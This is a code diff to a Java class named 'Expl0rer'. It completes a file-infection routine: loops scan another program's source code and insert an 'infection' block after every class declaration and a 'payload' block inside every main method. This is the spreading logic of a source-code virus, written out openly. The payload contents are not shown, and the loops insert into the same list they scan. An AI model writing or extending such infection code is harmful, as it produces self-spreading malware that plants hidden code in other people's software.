@@ -70,9 +70,17 @@ public class Expl0rer {
 		for(int i = 0; i < code.size(); ++i){
 			if(searchingClass){
 				//TODO: insert class Victim code here to find where to infect class
+				for(int j = 0; j < code.size(); j++){
+					if(code.get(j).contains("public class"))
+						code.add(j+1,infection);
+				}
 			}
 			else if(searchingMain){
 				//TODO: insert search for main code to add prelude payload inside of main
+				for(int j = 0; j < code.size(); j++){
+					if(code.get(j).contains("public static void main"))
+						code.add(j+1,payload);
+				}
 			}
 			else{
 				break;
